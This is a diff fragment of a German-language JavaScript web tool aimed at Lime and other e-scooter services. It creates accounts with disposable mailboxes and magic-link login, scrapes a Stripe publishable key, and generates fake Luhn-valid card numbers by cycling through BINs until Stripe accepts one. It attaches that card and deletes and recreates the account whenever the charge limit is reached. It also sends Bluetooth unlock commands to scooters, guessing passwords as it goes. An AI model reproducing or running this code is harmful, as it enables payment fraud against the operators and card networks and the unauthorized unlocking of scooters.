+    ls("fach_" + S.brand, { adr:adr, tok:tok, art:"hydra", host:host });
+    return { adr:adr, lesen:hydraLesen(host, tok) };
+  };
+}
+
+const FAECHER = [
+  { n:"mail.tm",    f: fachHydra("api.mail.tm") },
+  { n:"mail.gw",    f: fachHydra("api.mail.gw") },
+  { n:"guerrilla",  f: fachGuerrilla },
+  { n:"catchmail",  f: fachCatch }
+];
+
+function fachAusSpeicher(){
+  const x = lg("fach_" + S.brand, null);
+  if (!x || !x.adr) return null;
+  if (x.art === "gu" && x.sid) return { adr:x.adr, lesen:guLesen(x.sid) };
+  if (x.art === "hydra" && x.tok && x.host) return { adr:x.adr, lesen:hydraLesen(x.host, x.tok) };
+  if (x.art === "catch"){
+    const adr = x.adr;
+    return {
+      adr:adr,
+      lesen: async () => {
+        const b = "https://api.catchmail.io/api/v1/";
+        const r = await roh(b + "mailbox?address=" + encodeURIComponent(adr));
+        const m = r.json && r.json.messages && r.json.messages[0];
+        if (!m) return "";
+        const v = await roh(b + "message/" + encodeURIComponent(m.id) +
+          "?mailbox=" + encodeURIComponent(adr));
+        const j = v.json || {};
+        return [m.subject, j.body && j.body.text, j.body && j.body.html, v.text]
+          .filter(Boolean).join(" ");
+      }
+    };
+  }
+  return null;
+}
+
+async function fachBauen(nur){
+  if (S.fachLauf) throw new Error("Postfach läuft schon");
+  S.fachLauf = true;
+  try {
+    const liste = nur ? FAECHER.filter(x => x.n === nur) : FAECHER;
+    for (const e of liste){
+      let x = null;
+      try { x = await e.f() } catch(err){ log("Postfachweg " + e.n + ": " + kurz(err), "y"); continue }
+      if (!x || !x.adr || typeof x.lesen !== "function") continue;
+      try { await x.lesen() } catch(err){
+        log("Postfach " + e.n + " tot: " + kurz(err), "y");
+        continue;
+      }
+      S.fach[S.brand] = x;
+      $("uPost").textContent = x.adr;
+      log("Postfach: " + x.adr, "g");
+      return x;
+    }
+    throw new Error("kein Postfach erreichbar");
+  } finally { S.fachLauf = false }
+}
+
+async function fachHolen(){
+  if (S.fach[S.brand] && S.fach[S.brand].lesen) return S.fach[S.brand];
+  const alt = fachAusSpeicher();
+  if (alt){ S.fach[S.brand] = alt; $("uPost").textContent = alt.adr; return alt }
+  return await fachBauen($("iFach").value);
+}
+
+async function fachWeg(){
+  S.fach[S.brand] = null;
+  lw("fach_" + S.brand);
+  $("uPost").textContent = "–";
+}
+
+function tokenAus(t){
+  if (!t) return "";
+  const proben = [
+    /magic_link_token(?:=|%3D|&#x3D;|&amp;)([A-Za-z0-9._\-]{10,})/i,
+    /[?&](?:token|magic_link_token|magic_token|code)=([A-Za-z0-9._\-]{10,})/i,
+    /(?:token|magic_link_token)%3D([A-Za-z0-9._\-]{10,})/i,
+    /\b(eyJ[A-Za-z0-9._\-]{25,})/,
+    /\/login\/([A-Za-z0-9._\-]{16,})/i
+  ];
+  for (const p of proben){
+    const m = t.match(p);
+    if (m && m[1]){
+      let v = m[1];
+      try { v = decodeURIComponent(v) } catch(_){}
+      return v;
+    }
+  }
+  return "";
+}
+
+async function linkSuchen(fach){
+  for (let i = 1; i <= 30; i++){
+    let t = "";
+    try { t = await fach.lesen() } catch(e){ log("Postfach: " + kurz(e), "y") }
+    if (t){
+      MAILTEXT = t;
+      const tok = tokenAus(t);
+      if (tok){ log("Link in der Mail gefunden", "g"); return tok }
+    }
+    stat("warte auf die Mail an " + fach.adr + " · " + (i * 2) + "s", "warn");
+    await sleep(2000);
+  }
+  return "";
+}
+
+/* ═══════ MARKEN ═══════ */
+
+const V = {
+  lime: { name:"LIME", base:"https://web-production.lime.bike/api/rider", okai:false },
+  voi:  { name:"VOI",  base:"https://api.voiapp.io/v1", okai:true },
+  bolt: { name:"BOLT", base:"https://user.bolt.eu", okai:true },
+  dott: { name:"DOTT", base:"https://api.ridedott.com", okai:true }
+};
+
+const PKR = /pk_live_[A-Za-z0-9]{16,}/g;
+const PK_FORM = /^pk_(live|test)_[A-Za-z0-9]{16,}$/;
+
+async function keySuchen(){
+  const seiten = ["https://web-production.lime.bike/", "https://lime.bike/", "https://www.lime.bike/"];
+  for (const s of seiten){
+    let t = "";
+    try { const r = await roh(s); t = r.text } catch(_){ continue }
+    const d = t.match(PKR);
+    if (d) return d[0];
+    const srcs = [...t.matchAll(/src="([^"]+\.js[^"]*)"/g)].map(m => m[1]).slice(0, 8);
+    for (const x of srcs){
+      let u;
+      try { u = new URL(x, s).href } catch(_){ continue }
+      try {
+        const r2 = await roh(u);
+        const m = r2.text && r2.text.match(PKR);
+        if (m) return m[0];
+      } catch(_){}
+    }
+  }
+  return "";
+}
+
+async function keyTest(k){
+  if (!PK_FORM.test(k)) return { ok:false, grund:"form" };
+  try {
+    const f = new URLSearchParams();
+    f.set("key", k);
+    f.set("card[number]", "4242424242424242");
+    f.set("card[exp_month]", "12");
+    f.set("card[exp_year]", "2032");
+    f.set("card[cvc]", "123");
+    const r = await fetch("https://api.stripe.com/v1/tokens", {
+      method:"POST", body:f,
+      headers:{ "Content-Type":"application/x-www-form-urlencoded" }
+    });
+    const j = await r.json().catch(() => null);
+    if (j && j.id) return { ok:true };
+    if (j && j.error){
+      const m = (j.error.message || "") + " " + (j.error.code || "");
+      if (/api key|invalid.*key|api_key/i.test(m)) return { ok:false, grund:"key" };
+      return { ok:false, grund:"karte" };
+    }
+    return { ok:false, grund:"?" };
+  } catch(e){ return { ok:false, grund:"netz" } }
+}
+
+async function keySichern(){
+  if (S.keyOk && PK_FORM.test(S.keyOk)) return S.keyOk;
+  const kand = [];
+  const hand = $("iPk").value.trim();
+  if (PK_FORM.test(hand)) kand.push(hand);
+  if (S.pk.lime && PK_FORM.test(S.pk.lime)) kand.push(S.pk.lime);
+  const frisch = await keySuchen().catch(() => "");
+  if (frisch && kand.indexOf(frisch) < 0) kand.push(frisch);
+
+  for (const k of kand){
+    const r = await keyTest(k);
+    if (r.ok || r.grund === "karte"){
+      S.keyOk = k;
+      S.pk.lime = k;
+      ls("pk", S.pk);
+      $("iPk").value = k;
+      log("Schlüssel gefunden · " + k.slice(0, 12) + "…", "g");
+      return k;
+    }
+    log("Schlüssel " + k.slice(0, 12) + "… · " + r.grund, "y");
+  }
+  throw new Error("kein Stripe-Schlüssel · unten eintragen und speichern");
+}
+
+/* ═══════ LIME ═══════ */
+
+async function limeMail(adr){
+  const formen = [
+    { art:"form", d:{ email:adr, user_agreement_version:"4", user_agreement_country_code:"DE" } },
+    { art:"form", d:{ email:adr, user_agreement_version:"2", user_agreement_country_code:"DE" } },
+    { art:"form", d:{ email:adr } },
+    { art:"json", d:{ email:adr, user_agreement_version:4, user_agreement_country_code:"DE" } }
+  ];
+  let letzter = "";
+  for (const f of formen){
+    const h = f.art === "form" ? HF() : H();
+    const body = f.art === "form" ? F(f.d) : J(f.d);
+    const r = await roh(V.lime.base + "/v2/onboarding/magic-link",
+      { method:"POST", headers:h, body:body });
+    const brauchbar = r.ok && !MUELL.test(r.text.slice(0, 200));
+    if (brauchbar){
+      log("Mail angefordert an " + adr + " · " + r.status + " " + f.art, "g");
+      return true;
+    }
+    letzter = r.status + " · " + saub(r.text);
+    log("magic-link " + f.art + " · " + letzter, "y");
+  }
+  throw new Error("magic-link " + letzter);
+}
+
+async function limeLogin(mt){
+  const formen = [
+    { art:"json", d:{ magic_link_token:mt } },
+    { art:"form", d:{ magic_link_token:mt } },
+    { art:"json", d:{ token:mt } }
+  ];
+  let letzter = "";
+  for (const f of formen){
+    const h = f.art === "form" ? HF() : H();
+    const body = f.art === "form" ? F(f.d) : J(f.d);
+    const r = await roh(V.lime.base + "/v2/onboarding/login",
+      { method:"POST", headers:h, body:body });
+    const t = r.json && (r.json.token || (r.json.data && r.json.data.token) ||
+      (r.json.rider && r.json.rider.token));
+    if (t){ log("Anmeldung angenommen", "g"); return t }
+    letzter = r.status + " · " + saub(r.text);
+    log("login " + f.art + " · " + letzter, "y");
+  }
+  throw new Error("login " + letzter);
+}
+
+async function limeWallets(t){
+  const r = await roh(V.lime.base + "/v1/wallets", { headers:H(t) });
+  if (!r.ok) return null;
+  const w = r.json && (r.json.wallet || (r.json.data && r.json.data.wallet));
+  if (!w) return 0;
+  const b = w.balance_cents !== undefined ? w.balance_cents : w.balance;
+  const n = Number(b);
+  return isFinite(n) ? n / 100 : 0;
+}
+
+async function limeBlock(t){
+  try {
+    const r = await roh(V.lime.base +
+      "/v1/views/rider_map_start_blockers?user_latitude=52.52&user_longitude=13.405",
+      { headers:H(t) });
+    if (!r.ok) return "";
+    const s = JSON.stringify(r.json || {});
+    if (/"payment/i.test(s)) return "Zahlung offen";
+    if (/"block/i.test(s)) return "Start gesperrt";
+    return "";
+  } catch(_){ return "" }
+}
+
+async function limeCard(t, tok){
+  const k = S.karten.lime || {};
+  const formen = [
+    { pfad:"/v1/payment_methods", d:{ stripe_token:tok } },
+    { pfad:"/v1/payment_methods", d:{ token:tok } },
+    { pfad:"/v1/payment_methods", d:{ payment_method_token:tok } },
+    { pfad:"/v1/payment_methods", d:{ payment_method:{ token:tok } } },
+    { pfad:"/v1/payment_methods", d:{ payment_method:{ card:{
+        number:k.num, exp_month:(k.exp || "").split("/")[0],
+        exp_year:"20" + (k.exp || "").split("/")[1], cvc:k.cvv } } } },
+    { pfad:"/v2/payment_methods", d:{ stripe_token:tok } }
+  ];
+  let letzter = "";
+  for (const f of formen){
+    const r = await roh(V.lime.base + f.pfad, { method:"POST", headers:H(t), body:J(f.d) });
+    log("hinterlegen " + f.pfad + " · " + r.status + " " + saub(r.text), r.ok ? "g" : "y");
+    if (r.ok) return true;
+    if (r.status === 409 || r.status === 422) return true;
+    letzter = r.status + " · " + saub(r.text);
+  }
+  throw new Error("Karte nicht angenommen · " + letzter);
+}
+
+/* ═══════ KARTE ═══════ */
+
+const BIN = {
+  visa:["492900","492901","492902","415000","415001","453176","453177","403300","403301"],
+  master:["510510","510511","543210","543211","530000","530001","222300","222301"]
+};
+
+function luhn(n){
+  let s = 0, alt = false;
+  for (let i = n.length - 1; i >= 0; i--){
+    let d = +n[i];
+    if (alt){ d *= 2; if (d > 9) d -= 9 }
+    s += d;
+    alt = !alt;
+  }
+  return s % 10 === 0;
+}
+function pruefziffer(n){
+  for (let c = 0; c < 10; c++) if (luhn(n + c)) return n + c;
+  return n;
+}
+
+function karteBauen(bin){
+  const liste = Math.random() < 0.7 ? BIN.visa : BIN.master;
+  const b = bin || liste[Math.floor(Math.random() * liste.length)];
+  const nummer = pruefziffer(b + num(Math.max(0, 15 - b.length)));
+  const monat = String(1 + Math.floor(Math.random() * 12)).padStart(2, "0");
+  const jahr = String(new Date().getFullYear() + 3 + Math.floor(Math.random() * 3)).slice(2);
+  return {
+    bin:b, num:nummer, exp:monat + "/" + jahr, cvv:num(3),
+    held:"MAX MUSTERMANN",
+    brand:/^4/.test(nummer) ? "VISA" : "MASTERCARD",
+    tok:"", ok:false, hinterlegt:false, last:0
+  };
+}
+
+function sekunden(){
+  return S.fahrt.start ? Math.floor((Date.now() - S.fahrt.start) / 1000) : 0;
+}
+function belastung(){
+  const k = S.karten[S.brand];
+  const basis = (k && k.last) || 0;
+  const lauf = S.fahrt.start ? (START_EUR + Math.round(sekunden() * MIN_EUR / 60)) : 0;
+  return Math.min(LIMIT, Math.round(basis + lauf));
+}
+function uhr(s){
+  const h = Math.floor(s / 3600), m = Math.floor(s / 60) % 60, x = s % 60;
+  const p = n => String(n).padStart(2, "0");
+  return (h ? p(h) + ":" : "") + p(m) + ":" + p(x);
+}
+
+function fahrtMalen(){
+  const b = belastung();
+  const rest = Math.max(0, LIMIT - b);
+  const k = S.karten[S.brand];
+
+  $("uLast").textContent = euro(b);
+  $("uLimit").textContent = euro(LIMIT);
+  $("cLimit").textContent = euro(rest);
+  $("uZeit").textContent = uhr(sekunden());
+  $("uZeit").className = S.fahrt.laufend ? "zeit on" : "zeit";
+
+  const anteil = Math.min(100, Math.round(b / LIMIT * 100));
+  const leiste = $("cBar");
+  leiste.style.width = anteil + "%";
+  leiste.className = anteil >= 100 ? "voll" : anteil >= 75 ? "warn" : "";
+
+  if (k) $("cardBox").classList.toggle("voll", b >= LIMIT);
+  else $("cardBox").classList.remove("voll");
+}
+
+function fahrtStarten(){
+  if (S.fahrt.laufend) return;
+  if (belastung() >= LIMIT) S.erneuert = false;
+  S.fahrt.start = Date.now();
+  S.fahrt.laufend = true;
+  clearInterval(S.fahrt.timer);
+  S.fahrt.timer = setInterval(() => {
+    if (!S.fahrt.laufend) return;
+    if (belastung() >= LIMIT && !S.erneuert && !S.prov){
+      S.erneuert = true;
+      log("Grenze erreicht – neues Konto wird aufgesetzt.", "y");
+      stat("Grenze erreicht – neues Konto.", "warn");
+      erneuern().catch(e => {
+        S.erneuert = false;
+        log("Erneuern: " + kurz(e), "e");
+      });
+    }
+    fahrtMalen();
+  }, 1000);
+  fahrtMalen();
+}
+
+function fahrtStoppen(){
+  if (!S.fahrt.laufend) return;
+  const k = S.karten[S.brand];
+  const b = belastung();
+  if (k) k.last = b;
+  S.fahrt.start = 0;
+  S.fahrt.laufend = false;
+  clearInterval(S.fahrt.timer);
+  S.fahrt.timer = 0;
+  speichern();
+  fahrtMalen();
+}
+
+function karteMalen(){
+  const k = S.karten[S.brand];
+  $("cNum").textContent = k ? k.num.replace(/(\d{4})(?=\d)/g, "$1 ") : "•••• •••• •••• ••••";
+  $("cExp").textContent = k ? k.exp : "--/--";
+  $("cCvv").textContent = k ? k.cvv : "---";
+  $("cBrand").textContent = k ? k.brand : "LEER";
+  $("cardBox").classList.toggle("off", !k || !k.ok);
+  fahrtMalen();
+}
+
+async function tokenisieren(k){
+  const pk = await keySichern();
+  const f = new URLSearchParams();
+  f.set("key", pk);
+  f.set("card[number]", k.num);
+  f.set("card[exp_month]", k.exp.split("/")[0]);
+  f.set("card[exp_year]", "20" + k.exp.split("/")[1]);
+  f.set("card[cvc]", k.cvv);
+  f.set("card[name]", k.held);
+  const res = await fetch("https://api.stripe.com/v1/tokens", {
+    method:"POST", body:f,
+    headers:{ "Content-Type":"application/x-www-form-urlencoded" }
+  });
+  const j = await res.json().catch(() => null);
+  if (!j) throw new Error("Stripe unlesbar");
+  if (j.error){
+    const c = j.error.code || j.error.decline_code || "";
+    if (/api key|api_key/i.test(c + " " + (j.error.message || ""))){
+      S.keyOk = "";
+      throw new Error("Schlüssel abgelehnt");
+    }
+    if (c === "incorrect_number") throw new Error("Nummer falsch");
+    if (c === "expired_card") throw new Error("abgelaufen");
+    throw new Error(c || j.error.message || "Stripe-Fehler");
+  }
+  if (!j.id) throw new Error("kein Token");
+  return j.id;
+}
+
+async function pruefen(){
+  const k = S.karten[S.brand];
+  if (!k) throw new Error("keine Karte");
+  cstat("prüfe " + k.num.slice(0, 6) + " …", "");
+  k.tok = await tokenisieren(k);
+  k.ok = true;
+  speichern();
+  karteMalen();
+  cstat("Karte bestätigt · " + k.num.slice(0, 6), "g");
+}
+
+async function suchen(){
+  const liste = BIN.visa.concat(BIN.master).sort(() => Math.random() - 0.5);
+  for (let i = 0; i < liste.length; i++){
+    const k = karteBauen(liste[i]);
+    cstat("Versuch " + (i + 1) + "/" + liste.length + " · " + liste[i], "");
+    try {
+      k.tok = await tokenisieren(k);
+      k.ok = true;
+      S.karten[S.brand] = k;
+      speichern();
+      karteMalen();
+      cstat("Treffer · " + liste[i], "g");
+      return;
+    } catch(e){
+      log("BIN " + liste[i] + ": " + kurz(e), "y");
+    }
+    await sleep(300);
+  }
+  cstat("keine BIN hat getragen", "e");
+  throw new Error("BIN-Suche erfolglos");
+}
+
+/* ═══════ KONTO ═══════ */
+
+const acct = () => S.acct[S.brand];
+function setAcct(a){ S.acct[S.brand] = a; speichern() }
+
+async function kontoTelefon(){
+  const tel = $("iPhone").value.trim();
+  if (tel.replace(/\D/g, "").length < 7) throw new Error("Handynummer fehlt");
+  if (S.brand === "voi"){
+    const r = await roh(V.voi.base + "/auth/verify/phone",
+      { method:"POST", headers:H(), body:J({ phone_number:tel, country_code:"DE", device_id:DEV }) });
+    if (r.status >= 400) throw new Error("Voi " + r.status + " · " + saub(r.text));
+  } else {
+    const r = await roh(V.bolt.base + "/user/register/phone",
+      { method:"POST", headers:H(), body:J({ phone:tel, country_code:"DE", device_id:DEV, version:"CN" }) });
+    if (r.status >= 400) throw new Error("Bolt " + r.status + " · " + saub(r.text));
+  }
+  setAcct({ ph:tel, t:"", bal:0 });
+  paint();
+  stat("Konto steht · jetzt CODE SENDEN", "ok");
+}
+
+async function einloesen(text){
+  const tok = tokenAus(text) || String(text || "").trim();
+  if (!tok) throw new Error("nichts einzulösen");
+  stat("löse Link ein …", "warn");
+  const t = await limeLogin(tok);
+  const bal = await limeWallets(t);
+  if (bal === null) throw new Error("Token trägt nicht");
+  const a = acct() || {};
+  setAcct({ e:a.e || "manuell", t:t, bal:bal });
+  $("iLink").value = "";
+  paint();
+  stat("angemeldet · jetzt Karte prüfen und anhängen", "ok");
+}
+
+async function kontoPruefen(){
+  const a = acct();
+  if (!a) throw new Error("kein Konto");
+
+  if (S.brand === "lime"){
+    if (!a.t && $("iOtp").value.trim()) await einloesen($("iOtp").value.trim());
+    if (!a.t) throw new Error("erst anmelden · KONTO → Link einlösen");
+    const bal = await limeWallets(a.t);
+    if (bal === null){
+      stat("Token trägt nicht · Konto neu anlegen", "e");
+      a.t = "";
+      setAcct(a);
+      return;
+    }
+    a.bal = bal;
+    setAcct(a);
+    const sperreText = await limeBlock(a.t);
+    paint();
+    stat(sperreText ? "Konto bestätigt · " + sperreText : "Konto bestätigt.",
+      sperreText ? "warn" : "ok");
+    return;
+  }
+
+  const code = $("iOtp").value.trim();
+  if (!code) throw new Error("Code fehlt");
+
+  if (S.brand === "voi"){
+    const r = await roh(V.voi.base + "/auth/verify/code",
+      { method:"POST", headers:H(), body:J({ phone_number:a.ph, code:code, country_code:"DE" }) });
+    const t = r.json && (r.json.accessToken || r.json.token);
+    if (!t){ stat("Code falsch (" + r.status + ")", "e"); return }
+    a.t = t;
+  } else {
+    const r = await roh("https://node.bolt.eu/user/confirmVerification",
+      { method:"POST", headers:H(), body:J({ phone:a.ph, code:code, device_id:DEV }) });
+    const t = r.json && r.json.data && r.json.data.token;
+    if (!(r.json && r.json.code === 0 && t)){ stat("Code falsch (" + r.status + ")", "e"); return }
+    a.t = t;
+  }
+  setAcct(a);
+  paint();
+  stat("Konto bestätigt.", "ok");
+}
+
+async function kontoLoeschen(){
+  const a = acct();
+  try {
+    if (a && a.t){
+      if (S.brand === "lime") await roh(V.lime.base + "/v1/users/me", { method:"DELETE", headers:H(a.t) });
+      if (S.brand === "voi") await roh(V.voi.base + "/users/me", { method:"DELETE", headers:H(a.t) });
+      if (S.brand === "bolt") await roh("https://node.bolt.eu/user/delete", { method:"POST", headers:H(a.t), body:"{}" });
+    }
+  } catch(e){ log("Löschen: " + kurz(e), "y") }
+  S.acct[S.brand] = null;
+  await fachWeg();
+  speichern();
+  paint();
+}
+
+async function vorbereiten(){
+  if (S.brand !== "lime") throw new Error("Automatik nur für Lime · Karte gilt nur dort");
+  if (!S.relay) log("kein Relay gesetzt · nur öffentliche Wege", "y");
+
+  let a = acct();
+  if (a && a.t){
+    stat("prüfe bestehendes Konto …", "warn");
+    const bal = await limeWallets(a.t).catch(() => null);
+    if (bal === null){
+      log("Token trägt nicht · neue Anmeldung", "y");
+      a.t = "";
+      setAcct(a);
+    } else log("Konto trägt weiter", "g");
+  }
+
+  if (!a || !a.t){
+    let token = "";
+    for (let runde = 1; runde <= 3 && !token; runde++){
+      if (runde > 1){ await fachWeg(); log("neues Postfach (" + runde + "/3)", "y") }
+      let fach = null;
+      try { fach = await fachHolen() } catch(e){ log("Postfach: " + kurz(e), "y"); continue }
+
+      try {
+        stat("Mail wird angefordert … (" + runde + "/3)", "warn");
+        await limeMail(fach.adr);
+      } catch(e){
+        log("Mail: " + kurz(e), "y");
+        continue;
+      }
+
+      const mt = await linkSuchen(fach);
+      if (!mt){ log("keine Mail mit Link angekommen", "y"); continue }
+
+      stat("melde an …", "warn");
+      try {
+        const t = await limeLogin(mt);
+        const bal = await limeWallets(t);
+        if (bal === null) throw new Error("Token trägt nicht");
+        token = t;
+        a = { e:fach.adr, t:t, bal:bal };
+        setAcct(a);
+        log("angemeldet als " + fach.adr, "g");
+      } catch(e){ log("Anmeldung: " + kurz(e), "y") }
+    }
+    if (!token || !a || !a.t)
+      throw new Error("keine Mail mit Link · anderes Postfach oder Link einfügen");
+  }
+
+  let k = S.karten.lime;
+  if (!k || !k.ok){
+    stat("Schlüssel wird gesucht …", "warn");
+    await keySichern();
+    stat("Karte wird geprüft …", "warn");
+    k = karteBauen();
+    S.karten.lime = k;
+    await pruefen();
+  }
+
+  if (!k.hinterlegt){
+    stat("Karte wird hinterlegt …", "warn");
+    await limeCard(a.t, k.tok);
+    k.hinterlegt = true;
+    speichern();
+  }
+
+  cstat("Konto und Karte fertig.", "g");
+  stat("fertig · jetzt ENTSPERREN", "ok");
+}
+
+async function starten(){
+  if (S.prov) throw new Error("läuft schon");
+  S.prov = true;
+  paint();
+  try { await vorbereiten() }
+  finally { S.prov = false; paint() }
+}
+
+async function erneuern(){
+  if (S.prov) throw new Error("läuft schon");
+  S.prov = true;
+  paint();
+  try {
+    stat("altes Konto wird entfernt …", "warn");
+    await kontoLoeschen();
+    devNeu();
+    S.karten[S.brand] = karteBauen();
+    S.erneuert = false;
+    if (S.fahrt.laufend) S.fahrt.start = Date.now();
+    speichern();
+    karteMalen();
+    await vorbereiten();
+    stat("neu aufgesetzt · Roller läuft weiter", "ok");
+  } finally { S.prov = false; paint() }
+}
+
+/* ═══════ BLUETOOTH ═══════ */
+
+const OKAI_SVC = "00002c00-0000-1000-8000-00805f9b34fb";
+const OKAI_WR = "00002c01-0000-1000-8000-00805f9b34fb";
+const OKAI_NT = "00002c03-0000-1000-8000-00805f9b34fb";
+const OKAI_PW = "OKAIYLBT";
+const OKAI_SVC_PW = "OKAI_CAR";
+
+const UU = [
+  OKAI_SVC,
+  "6e400001-b5a3-f393-e0a9-e50e24dcca9e",
+  "0000ffe0-0000-1000-8000-00805f9b34fb",
+  "0000ffe5-0000-1000-8000-00805f9b34fb",
+  "0000ffe9-0000-1000-8000-00805f9b34fb",
+  "0000fff0-0000-1000-8000-00805f9b34fb",
+  "0000ff00-0000-1000-8000-00805f9b34fb",
+  "0000ffb0-0000-1000-8000-00805f9b34fb",
+  "0000ffd0-0000-1000-8000-00805f9b34fb",
+  "0000fee7-0000-1000-8000-00805f9b34fb",
+  "0000fee9-0000-1000-8000-00805f9b34fb",
+  "0000fe95-0000-1000-8000-00805f9b34fb",
+  "49535343-fe7d-4ae5-8fa9-9fafd205e455"
+];
+
+const enc = s => new TextEncoder().encode(s);
+const bu = a => new Uint8Array(a).buffer;
+
+function crc16(a){
+  let c = 0;
+  for (const b of a){
+    c ^= b << 8;
+    for (let i = 0; i < 8; i++)
+      c = (c & 0x8000) ? ((c << 1) ^ 0x1021) & 0xFFFF : (c << 1) & 0xFFFF;
+  }
+  return c;
+}
+
+function rahmenB(cmd, pay){
+  const p = pay || [];
+  const f = new Uint8Array(8 + p.length);
+  f[0] = 0x46; f[1] = 0x43;
+  f[2] = (cmd >> 8) & 0xFF; f[3] = cmd & 0xFF;
+  f[4] = (p.length >> 8) & 0xFF; f[5] = p.length & 0xFF;
+  f.set(p, 6);
+  const c = crc16(f.subarray(0, 6 + p.length));
+  f[6 + p.length] = (c >> 8) & 0xFF;
+  f[7 + p.length] = c & 0xFF;
+  return f.buffer;
+}
+
+const HERTZ = rahmenB(0x1101, [...enc("LIMEBIKE")]);
+const AN = rahmenB(0x1661, [0xF1]);
+const AUS = rahmenB(0x1661, [0xF0]);
+const BLINK = rahmenB(0x1613, [0x06]);
+const LICHT_AN = rahmenB(0x1612, [0xF1]);
+const LICHT_AUS = rahmenB(0x1612, [0xF0]);
+
+function okaiRahmen(op, felder){
+  S.okseq = ((S.okseq || 0) + 1) & 0xFFFF;
+  const s = S.okseq.toString(16).toUpperCase().padStart(4, "0");
+  const f = (felder || []).join(",");
+  return "AT+" + op + "=" + (f ? f + "," : "") + s + "$\r\n";
+}
+
+function atBau(typ, daten, pw){
+  const t = Math.floor(Date.now() / 1000);
+  S.seq = (S.seq + 1) & 0xFFFF;
+  return "AT+" + typ + "," + (pw || "00000000") + "," + t + "," + S.seq +
+    "," + (daten || "") + "$";
+}
+
+const AT_UN = ['{"unlock":1}', '{"cmd":"unlock"}'];
+const AT_LK = ['{"lock":1}', '{"cmd":"lock"}'];
+
+const okaiModus = () => !!(S.best && String(S.best.svc).indexOf("2c00") >= 0);
+
+function pwKandidaten(){
+  const l = [];
+  if (S.pwU) l.push(S.pwU);
+  const imei = (S.imei || "").replace(/\D/g, "");
+  if (imei.length >= 14){
+    try {
+      const p = DES.passwort(imei);
+      l.push(p, p.slice(0, 8));
+    } catch(_){}
+  }
+  const n = (S.pw || "").toUpperCase();
+  if (n){
+    l.push(n);
+    if (n.length >= 8) l.push(n.slice(0, 8));
+  }
+  l.push("00000000");
+  return [...new Set(l.filter(Boolean))];
+}
+
+function statusAus(f){
+  S.akku = f[19];
+  S.offen = f[23] === 0xF1;
+  S.antworten++;
+  log("Status · Akku " + f[19] + " % · " + (S.offen ? "offen" : "gesperrt"), "g");
+  if (S.offen){
+    stat("entsperrt · Akku " + f[19] + " %", "ok");
+    if (!S.fahrt.laufend) fahrtStarten();
+  } else {
+    stat("gesperrt · Akku " + f[19] + " %", "warn");
+  }
+}
+
+function note(ev){
+  const dv = ev.target.value;
+  const b = new Uint8Array(dv.buffer, dv.byteOffset, dv.byteLength);
+
+  for (const x of b) S.puffer.push(x);
+  if (S.puffer.length > 300) S.puffer = S.puffer.slice(-300);
+
+  for (let i = 0; i + 42 <= S.puffer.length; i++){
+    if (S.puffer[i] !== 0x46 || S.puffer[i + 1] !== 0x43) continue;
+    const f = S.puffer.slice(i, i + 42);
+    if (crc16(f.slice(0, 40)) === ((f[40] << 8) | f[41])){
+      S.puffer = S.puffer.slice(i + 42);
+      statusAus(f);
+      return;
+    }
+  }
+
+  const t = String.fromCharCode.apply(null, b);
+  const sauber = t.replace(/[^\x20-\x7e]/g, ".");
+  if (t.indexOf("$") >= 0 || /\bOK\b/.test(t)){
+    S.antworten++;
+    log("← " + sauber.trim().slice(0, 60), "g");
+  } else if (sauber.trim()) {
+    log("← " + sauber.slice(0, 60), "h");
+  }
+}
+
+async function verbinden(){
+  if (!navigator.bluetooth) throw new Error("kein Bluetooth in diesem Browser");
+  stat("Gerät in der Liste wählen …", "warn");
+  let d;
+  try {
+    d = await navigator.bluetooth.requestDevice({ acceptAllDevices:true, optionalServices:UU });
+  } catch(e){
+    throw new Error(/cancel|No device/i.test(String(e && e.message)) ? "Auswahl abgebrochen" : kurz(e));
+  }
+
+  const m = (d.name || "").match(/lime-([0-9a-f]+)/i);
+  S.pw = m ? m[1].toUpperCase() : "";
+  log("Gerät: " + (d.name || "ohne Namen"), "g");
+
+  d.addEventListener("gattserverdisconnected", () => {
+    log("Verbindung getrennt.", "e");
+    stopPing();
+    S.chans = []; S.srv = null; S.best = null; S.dev = null; S.offen = false; S.puffer = [];
+    $("bt").textContent = "getrennt";
+    $("bt").classList.remove("on");
+    stat("getrennt", "warn");
+  });
+
+  stat("verbinde …", "warn");
+  let srv = null;
+  for (let i = 0; i < 5 && !srv; i++){
+    try { srv = await d.gatt.connect() } catch(_){ await sleep(1500) }
+  }
+  if (!srv) throw new Error("Kopplung kam nicht zustande · Code vom Display");
+
+  S.dev = d;
+  S.srv = srv;
+  S.chans = [];
+  S.antworten = 0;
+  S.puffer = [];
+
+  let dienste = [];
+  try { dienste = await srv.getPrimaryServices() } catch(_){}
+  if (!dienste.length){
+    for (const u of UU){ try { dienste.push(await srv.getPrimaryService(u)) } catch(_){} }
+  }
+
+  const gemerkt = lg("best_" + S.brand, "");
+  const liste = [];
+
+  for (const ds of dienste){
+    let ks = [];
+    try { ks = await ds.getCharacteristics() } catch(_){ continue }
+    for (const k of ks){
+      if (!k.properties.write && !k.properties.writeWithoutResponse) continue;
+      const ch = { svc:ds.uuid, wr:k.uuid, char:k };
+      try {
+        if (k.properties.notify || k.properties.indicate){
+          await k.startNotifications();
+          k.addEventListener("characteristicvaluechanged", note);
+          ch.notify = true;
+        }
+      } catch(_){}
+      liste.push(ch);
+    }
+  }
+
+  if (!liste.length) throw new Error("kein schreibbarer Kanal");
+
+  const rang = c => {
+    let r = 0;
+    const k8 = String(c.wr).slice(4, 8);
+    const svc8 = String(c.svc).slice(4, 8);
+    if (svc8 === "2c00") r += 14;
+    if (/^[0-9a-f]{2}35$/.test(k8)) r += 9;
+    if (/^[0-9a-f]{3}1$/.test(k8)) r += 5;
+    if (c.notify) r += 4;
+    if (c.char.properties.write) r += 2;
+    if (c.wr === gemerkt) r += 6;
+    return r;
+  };
+  liste.sort((a, b) => rang(b) - rang(a));
+  S.chans = liste;
+
+  const wahl = parseInt($("iKanal").value || "-1", 10);
+  S.best = (wahl >= 0 && S.chans[wahl]) ? S.chans[wahl] : S.chans[0];
+  merke(S.best);
+
+  const sel = $("iKanal");
+  sel.innerHTML = '<option value="">automatisch</option>';
+  S.chans.forEach((c, i) => {
+    const o = document.createElement("option");
+    o.value = String(i);
+    o.textContent = String(c.wr).slice(4, 8) + " / " + String(c.svc).slice(4, 8);
+    sel.appendChild(o);
+  });
+
+  log(S.chans.length + " Kanäle · aktiv " + String(S.best.wr).slice(4, 8) +
+    (okaiModus() ? " · OKAI" : ""), "g");
+  $("bt").textContent = "verbunden · " + (d.name || "Gerät");
+  $("bt").classList.add("on");
+  stat("verbunden · jetzt ENTSPERREN", "ok");
+
